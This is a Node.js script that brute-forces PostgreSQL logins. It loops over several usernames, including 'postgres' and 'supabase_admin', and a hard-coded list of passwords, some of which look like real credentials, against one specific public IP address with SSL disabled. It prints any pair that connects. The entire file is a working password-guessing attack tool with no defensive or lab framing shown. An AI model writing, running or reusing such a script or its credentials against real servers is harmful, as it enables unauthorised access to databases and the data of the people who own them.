import pg from 'pg';

const passwords = ['R8mF9kP2sQ4VxA7ZLwC3eT', 'umrivvELEseN', 'Ublo2026SecurePass', '125714Ab#', 'postgres'];
const users = ['postgres', 'postgres.postgres', 'supabase_admin'];

async function test(user, pw) {
    const config = {
        host: '135.181.37.206',
        port: 5432,
        user: user,
        password: pw,
        database: 'postgres',
        ssl: false
    };
    const client = new pg.Client(config);
    try {
        await client.connect();
        console.log(`✅ Success: User=${user}, PW=${pw}`);
        await client.end();
        return true;
    } catch (err) {
        // console.log(`❌ Fail: User=${user}, PW=${pw} - ${err.message}`);
        return false;
    }
}

async function run() {
    console.log('Starting brute force...');
    for (const u of users) {
        for (const p of passwords) {
            if (await test(u, p)) return;
        }
    }
    console.log('Brute force finished - no success.');
}

run();
